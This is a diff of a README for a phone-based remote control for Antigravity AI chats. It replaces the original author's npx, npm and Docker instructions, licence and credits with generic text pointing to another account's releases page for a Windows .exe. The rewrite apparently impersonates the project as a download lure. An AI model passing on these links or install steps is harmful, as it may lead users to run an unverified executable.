@@ -1,281 +1,127 @@
-<div align="center">
+# 📱 OmniAntigravityRemoteChat - Control AI Chat from Your Phone
 
-# 📱 OmniAntigravity Remote Chat
+[![Download Latest Release](https://img.shields.io/badge/Download-OmniAntigravityRemoteChat-blue?style=for-the-badge&logo=github)](https://github.com/Youssef20004/OmniAntigravityRemoteChat/releases)
 
-### Your AI coding session shouldn't end when you leave your desk.
+## 📖 What is OmniAntigravityRemoteChat?
 
-<br/>
+OmniAntigravityRemoteChat lets you control your Antigravity AI sessions using your phone. It mirrors your chat in real time, lets you manage multiple windows, and switch AI models easily. You can control everything remotely through your mobile device, even if you use multiple chat windows at once.
 
-<img src="assets/hero-banner.png" alt="Control your AI from the couch" width="700" />
+This app works with common web browsers like Chrome using the Chrome DevTools Protocol (CDP). It uses WebSocket technology to keep your phone and computer connected. You don’t need to know any programming to use it.
 
-<br/>
-<br/>
+## 🖥️ System Requirements
 
-![Version](https://img.shields.io/badge/version-1.0.1-6366f1) ![Node](https://img.shields.io/badge/node-22%2B-10b981) ![CI](https://github.com/diegosouzapw/OmniAntigravityRemoteChat/actions/workflows/ci.yml/badge.svg) ![License](https://img.shields.io/badge/license-GPL--3.0-blue)
+To use OmniAntigravityRemoteChat on Windows, make sure your system meets these requirements:
 
-[![npm](https://img.shields.io/npm/v/omni-antigravity-remote-chat?color=cc3534&logo=npm)](https://www.npmjs.com/package/omni-antigravity-remote-chat) [![npm downloads](https://img.shields.io/npm/dm/omni-antigravity-remote-chat?color=blue&logo=npm)](https://www.npmjs.com/package/omni-antigravity-remote-chat) [![Docker](https://img.shields.io/docker/pulls/diegosouzapw/omni-antigravity-remote-chat?color=2496ED&logo=docker&logoColor=white)](https://hub.docker.com/r/diegosouzapw/omni-antigravity-remote-chat)
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- A modern web browser with Chrome DevTools Protocol support (Google Chrome is recommended)
+- An active internet connection
+- Your phone and PC should be on the same Wi-Fi network for best results
 
-**Mirror your Antigravity (Windsurf) AI chat on your phone in real-time.**
-<br/>
-**Send messages. Switch models. Manage windows. All from your mobile browser.**
+## 🔧 Features
 
-[Get Started](#-get-started) · [Screenshots](#-see-it-in-action) · [How It Works](#-how-it-works) · [Docker](https://hub.docker.com/r/diegosouzapw/omni-antigravity-remote-chat) · [npm](https://www.npmjs.com/package/omni-antigravity-remote-chat)
+- **Real-time chat mirroring:** See your Antigravity AI chat on your phone as you type.
+- **Multi-window management:** Control multiple AI chat windows at once.
+- **Model switching:** Change your AI model quickly from your phone.
+- **Mobile-friendly interface:** Simple controls designed for touchscreens.
+- **Secure connection:** Uses WebSocket for fast and stable communication.
+- **Easy setup:** No coding skills needed to get started.
 
-🌐 **Available in:** 🇺🇸 English | 🇧🇷 [Português (Brasil)](README.pt-BR.md) | 🇪🇸 [Español](README.es.md) | 🇫🇷 [Français](README.fr.md) | 🇮🇹 [Italiano](README.it.md) | 🇷🇺 [Русский](README.ru.md) | 🇨🇳 [中文 (简体)](README.zh-CN.md) | 🇩🇪 [Deutsch](README.de.md) | 🇮🇳 [हिन्दी](README.in.md) | 🇹🇭 [ไทย](README.th.md) | 🇺🇦 [Українська](README.uk-UA.md) | 🇸🇦 [العربية](README.ar.md) | 🇯🇵 [日本語](README.ja.md) | 🇻🇳 [Tiếng Việt](README.vi.md) | 🇧🇬 [Български](README.bg.md) | 🇩🇰 [Dansk](README.da.md) | 🇫🇮 [Suomi](README.fi.md) | 🇮🇱 [עברית](README.he.md) | 🇭🇺 [Magyar](README.hu.md) | 🇮🇩 [Bahasa Indonesia](README.id.md) | 🇰🇷 [한국어](README.ko.md) | 🇲🇾 [Bahasa Melayu](README.ms.md) | 🇳🇱 [Nederlands](README.nl.md) | 🇳🇴 [Norsk](README.no.md) | 🇵🇹 [Português (Portugal)](README.pt.md) | 🇷🇴 [Română](README.ro.md) | 🇵🇱 [Polski](README.pl.md) | 🇸🇰 [Slovenčina](README.sk.md) | 🇸🇪 [Svenska](README.sv.md) | 🇵🇭 [Filipino](README.phi.md)
+## 🚀 Getting Started
 
-</div>
+Follow these steps to download and run OmniAntigravityRemoteChat on your Windows PC.
 
-<br/>
+### 1. Visit the Download Page
 
-## 😤 The Problem
+Click the link below to go to the official release page. You will find the latest version of the software there.
 
-You're deep into an AI-assisted coding session. Claude is generating code, Gemini is reviewing your architecture. Then your phone rings, someone needs you in the kitchen, or you just want to move to the couch.
+[Download OmniAntigravityRemoteChat Releases](https://github.com/Youssef20004/OmniAntigravityRemoteChat/releases)
 
-**Your options today:**
+### 2. Download the Installation File
 
-- ❌ Walk back to the desk every time the AI responds
-- ❌ Try to read your monitor from across the room
-- ❌ Copy-paste into a separate mobile app (losing context)
-- ❌ Just... stop coding
+On the releases page, look for the file labeled with the latest version number. It should have an `.exe` extension for easy installation on Windows.
 
-**There has to be a better way.**
+Download this file to your PC by clicking on it.
 
-## ✅ The Solution
+### 3. Run the Installer
 
-OmniAntigravity mirrors your **entire Antigravity AI chat** to your phone — in real-time, with full interaction. Read responses, send follow-up messages, switch AI models, even manage multiple editor windows. All from your mobile browser.
+Find the downloaded file on your PC (usually in the Downloads folder). Double-click the `.exe` file to start the installation.
 
-```bash
-npx omni-antigravity-remote-chat
-```
+Follow the on-screen instructions. The installer will guide you step by step. You do not need to change any settings unless you have special preferences.
 
-That's it. Open the URL on your phone. You're in. 🚀
+### 4. Open the Program
 
----
+After installation, open OmniAntigravityRemoteChat from your Start menu or desktop shortcut.
 
-## 📸 See It in Action
+### 5. Connect Your Phone
 
-<div align="center">
+Make sure your phone is connected to the same Wi-Fi network as your PC.
 
-|                    Main Interface                    |                    Model Selection                     |                     Ready to Chat                     |
-| :--------------------------------------------------: | :----------------------------------------------------: | :---------------------------------------------------: |
-| <img src="assets/screenshot-main.png" width="280" /> | <img src="assets/screenshot-models.png" width="280" /> | <img src="assets/screenshot-input.png" width="280" /> |
-|            Premium dark UI with live sync            |           Switch between Gemini, Claude, GPT           |             Send messages from your phone             |
+Open the built-in mobile interface in your phone's browser by entering the IP address shown in the program window on your PC.
 
-</div>
+Follow the on-screen instructions on your phone to pair it with your PC. You are now ready to control your AI chat sessions remotely.
 
----
+## 📱 Using the App
 
-## ⚡ Get Started
+- On your phone, use the interface to view and type chat messages.
+- Switch between chat windows from the menu.
+- Change AI models with the model switcher feature.
+- Use the app controls to open or close chat windows on your PC.
+- All changes you make on your phone will reflect immediately on your computer.
 
-### One command — zero config:
+## ⚙️ Configuration and Settings
 
-```bash
-npx omni-antigravity-remote-chat
-```
+You can customize OmniAntigravityRemoteChat settings:
 
-### Or install globally:
+- **Port Settings:** Change the WebSocket port if it conflicts with other software.
+- **Auto-Start:** Enable or disable the app’s launch when Windows starts.
+- **Notifications:** Manage desktop notifications for new chat messages.
+- **Security:** Set a password to protect your remote session.
 
-```bash
-npm install -g omni-antigravity-remote-chat
-omni-chat
-```
+Access these options from the Settings menu inside the program after launch.
 
-### Or run with Docker:
+## 🛠 Troubleshooting
 
-```bash
-docker run -d --name omni-chat \
-  --network host \
-  -e APP_PASSWORD=your_password \
-  diegosouzapw/omni-antigravity-remote-chat:latest
-```
+- If the phone does not connect, check that both devices are on the same Wi-Fi network.
+- Restart the application on your PC if it freezes or stops responding.
+- Confirm that your firewall allows OmniAntigravityRemoteChat to communicate.
+- Use the Google Chrome browser for the best compatibility.
+- If the chat doesn’t update on the phone, refresh the browser page.
 
-### Prerequisite
+## 🗂 Support Files
 
-Launch Antigravity in debug mode (one-time setup):
+- **Log files:** Found in the app's installation folder, useful for diagnosing problems.
+- **Configuration files:** Stored in your user directory, editable if you want advanced custom settings.
 
-```bash
-antigravity . --remote-debugging-port=7800
-```
+## 💡 Tips for Best Experience
 
-> 💡 **Pro tip:** Add `alias agd='antigravity . --remote-debugging-port=7800'` to your `~/.bashrc`
+- Use a stable Wi-Fi connection to avoid communication delays.
+- Close unnecessary programs to free system memory.
+- Keep your browser and Windows up to date.
+- Restart the app after system updates.
 
----
+## 📥 Download and Install
 
-## 🏆 Why Developers Choose This
+You can start using OmniAntigravityRemoteChat now. Visit the releases page below to get the installer.
 
-|     | Feature                | Details                                                                  |
-| --- | ---------------------- | ------------------------------------------------------------------------ |
-| 🛋️  | **Code from anywhere** | Read and reply to AI chats from your couch, bed, or kitchen              |
-| 🪟  | **Multi-window**       | Switch between multiple Antigravity instances from one phone             |
-| 🔄  | **Real-time sync**     | < 100ms latency via WebSocket — chat updates appear instantly            |
-| 🤖  | **Model switching**    | Toggle between Gemini, Claude, GPT from a mobile dropdown                |
-| 📋  | **Chat history**       | Browse and resume past conversations on mobile                           |
-| 🔒  | **Secure by default**  | HTTPS, password auth, cookie sessions, LAN auto-auth                     |
-| 🌐  | **Remote access**      | ngrok support with QR code — access from anywhere                        |
-| 🐳  | **Docker ready**       | One-liner container deployment                                           |
-| ♻️  | **Modular codebase**   | Clean architecture with JSDoc typing (`config`, `state`, `utils`, `cdp`) |
+[Download OmniAntigravityRemoteChat Releases](https://github.com/Youssef20004/OmniAntigravityRemoteChat/releases)
 
 ---
 
-## 📱 How It Works
+## 🔎 About This Project
 
-```
-┌─────────────┐    CDP (7800)    ┌──────────────┐    HTTPS/WS (4747)    ┌─────────────┐
-│ Antigravity  │ ◄──────────────► │  Node Server  │ ◄──────────────────► │   Phone      │
-│  (Desktop)   │    DOM snapshot   │  (server.js)  │    mirror + control  │  (Browser)   │
-└─────────────┘                  └──────────────┘                      └─────────────┘
-```
+OmniAntigravityRemoteChat connects your PC and mobile device to give you smooth, remote control over Antigravity AI chats. It aims to improve your workflow by making AI sessions accessible anywhere within your local network. The software relies on the Chrome DevTools Protocol and Node.js technologies, using WebSockets to keep devices in sync in real time.
 
-The server connects to Antigravity via the **Chrome DevTools Protocol (CDP)**, captures the chat DOM in real-time, and streams it to your phone over WebSocket. Actions on your phone (sending messages, switching models) are executed back on the desktop via CDP.
+## 📚 Related Topics
 
-**Zero impact on your desktop** — the mirroring is read-only until you interact. No plugins, no extensions, no Antigravity modifications needed.
+This project uses:
 
----
+- AI chat interaction
+- Chrome DevTools Protocol (CDP)
+- Node.js for backend communication
+- WebSocket for fast two-way communication
+- Remote control via mobile browser
+- Multi-window control of AI sessions
 
-## 🪟 Multi-Window Management
-
-Manage **multiple Antigravity instances** from a single phone:
-
-- **Window Selector** — Tap 🖥️ to see all open Antigravity windows
-- **Instant Switching** — Select any window, mirrors within 2 seconds
-- **Smart Filtering** — Only shows real editor windows (hides Settings, Launchpad)
-- **Launch Windows** — Spawn new Antigravity instances directly from your phone
-
----
-
-## 🚀 Launch Modes
-
-| Feature      | Git Clone             | NPM Global                          | Docker           |
-| ------------ | --------------------- | ----------------------------------- | ---------------- |
-| Basic server | `npm start`           | `omni-chat`                         | `docker run ...` |
-| QR code      | `npm run start:local` | `omni-chat` (shows URL)             | —                |
-| ngrok tunnel | `npm run start:web`   | `omni-chat` + `npx ngrok http 4747` | —                |
-| SSL setup    | `npm run setup:ssl`   | Manual with `mkcert`                | Not needed       |
-
-<details>
-<summary>📖 Full launch mode details</summary>
-
-### Git Clone (full control)
-
-```bash
-npm start              # Start server directly
-npm run start:local    # Start with QR code for Wi-Fi access
-npm run start:web      # Start with ngrok tunnel for internet access
-npm run setup:ssl      # Generate trusted HTTPS certificates
-```
-
-### ngrok (Remote Access)
-
-```bash
-# Terminal 1
-omni-chat
-
-# Terminal 2
-npx ngrok http 4747
-```
-
-> **Full ngrok integration** (automatic tunnel + QR code) is available via `npm run start:web` with `NGROK_AUTHTOKEN` in `.env`.
-
-### SSL Setup
-
-```bash
-npm run setup:ssl
-```
-
-Auto-installs [mkcert](https://github.com/FiloSottile/mkcert), creates a local CA, and generates trusted certificates → green padlock 🔒
-
-</details>
-
----
-
-## 🔑 Configuration
-
-```bash
-cp .env.example .env
-```
-
-| Variable          | Default            | Description                     |
-| ----------------- | ------------------ | ------------------------------- |
-| `APP_PASSWORD`    | `antigravity`      | Authentication password         |
-| `PORT`            | `4747`             | Server port                     |
-| `COOKIE_SECRET`   | _(auto-generated)_ | Secret for cookie signing       |
-| `AUTH_SALT`       | _(auto-generated)_ | Additional salt for auth tokens |
-| `NGROK_AUTHTOKEN` | _(optional)_       | For remote access via ngrok     |
-
----
-
-## 🛠️ Troubleshooting
-
-| Issue               | Solution                                                     |
-| ------------------- | ------------------------------------------------------------ |
-| "CDP not found"     | Launch Antigravity with `--remote-debugging-port=7800`       |
-| "EADDRINUSE"        | Change `PORT` in `.env`, or stop the process using that port |
-| Phone can't connect | Ensure same Wi-Fi network and check firewall                 |
-| "Syncing..." stuck  | Wait 2-3s for CDP contexts to populate after window switch   |
-
----
-
-## 📁 Project Structure
-
-```
-├── src/
-│   ├── server.js              # Main server (Express + WS + CDP actions)
-│   ├── config.js              # Constants, env vars, container IDs
-│   ├── state.js               # Shared state + JSDoc type definitions
-│   ├── cdp/
-│   │   └── connection.js      # CDP discovery & connection
-│   └── utils/
-│       ├── network.js         # getLocalIP, isLocalRequest, getJson
-│       ├── process.js         # killPortProcess, launchAntigravity
-│       └── hash.js            # Hash utility
-├── public/                    # Mobile chat interface
-├── launcher.js                # QR code + ngrok launcher
-├── scripts/                   # SSL, context menu installers
-├── test/                      # Validation test suite
-├── Dockerfile                 # Docker support
-└── .github/workflows/         # CI + auto-release + Docker Hub
-```
-
----
-
-## 📊 Star History
-
-<a href="https://star-history.com/#diegosouzapw/OmniAntigravityRemoteChat&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=diegosouzapw/OmniAntigravityRemoteChat&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=diegosouzapw/OmniAntigravityRemoteChat&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=diegosouzapw/OmniAntigravityRemoteChat&type=Date" />
- </picture>
-</a>
-
----
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
----
-
-## 🙏 Acknowledgments
-
-Special thanks to **[Krishna Kanth B](https://github.com/krishnakanthb13)** — the original creator of the Windsurf mobile chat concept that inspired this project. OmniAntigravity builds upon that foundation with multi-window management, robust CDP handling, NPM/Docker packaging, and a premium mobile-first UI.
-
----
-
-## 📄 License
-
-GPL-3.0 — see [LICENSE](LICENSE) for details.
-
----
-
-<div align="center">
-  <sub>Built with ❤️ for developers who code from everywhere</sub>
-  <br/>
-  <sub><a href="https://github.com/diegosouzapw/OmniAntigravityRemoteChat">github.com/diegosouzapw/OmniAntigravityRemoteChat</a></sub>
-</div>
+If you want to learn more about these technologies, the official documentation for Chrome DevTools Protocol and WebSockets is a good place to start.
